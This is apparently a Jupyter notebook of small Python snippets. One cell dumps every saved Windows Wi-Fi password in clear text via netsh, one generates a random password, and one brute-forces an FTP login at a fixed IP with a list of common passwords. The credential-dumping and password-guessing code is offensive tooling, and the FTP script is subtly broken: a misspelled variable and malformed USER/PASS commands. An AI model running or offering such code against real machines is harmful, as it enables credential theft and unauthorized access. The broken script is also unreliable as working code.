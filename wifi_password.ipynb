{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import subprocess\n",
    "a = subprocess.check_output(['netsh','wlan','show','profiles']).decode('utf-8').split('\\n')\n",
    "a = [i.split(':')[1][1:-1] for i in a if 'All User Profile' in i]\n",
    "for i in a:\n",
    "    results = subprocess.check_output(['netsh','wlan','show','profiles', i, 'key=clear']).decode('utf-8').split('\\n')\n",
    "    results = [b.split(':')[1][1:-1] for b in results if 'Key Content' in b]\n",
    "    try:\n",
    "        print(\"{:<30}| {:<}\".format(i, results[0]))\n",
    "    except:\n",
    "        print(\"{:<30}| {:<}\".format(i, \"\"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "WENlfefbTi\n"
     ]
    }
   ],
   "source": [
    "import secrets\n",
    "import string\n",
    "alphabet = string.ascii_letters + string.digits\n",
    "password = ''.join(secrets.choice(alphabet) for i in range(10))\n",
    "print(password)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket\n",
    "import re\n",
    "import sys\n",
    "\n",
    "def connect(username, password):\n",
    "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "    print('[*] Trying '+username+':'+password)\n",
    "    s.connect(('192.168.1.100', 21))\n",
    "    data = s.recv(1024)\n",
    "    s.send('USER'+username+'\\r\\n')\n",
    "    data = s.recv(1024)\n",
    "    s.send('PASS'+password+'\\r\\n')\n",
    "    data = s.recv(3)\n",
    "    s.send('QUIT\\r\\n')\n",
    "    s.close()\n",
    "    return data\n",
    "username = 'any username'\n",
    "passwords = ['test', 'backup', 'password', '12345', 'root', 'administrator', 'ftp', 'admin']\n",
    "for password in passwords:\n",
    "    attemp = connect(username, password)\n",
    "    if attempt=='230':\n",
    "        print('[*] password found: '+password)\n",
    "        sys.exit(0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
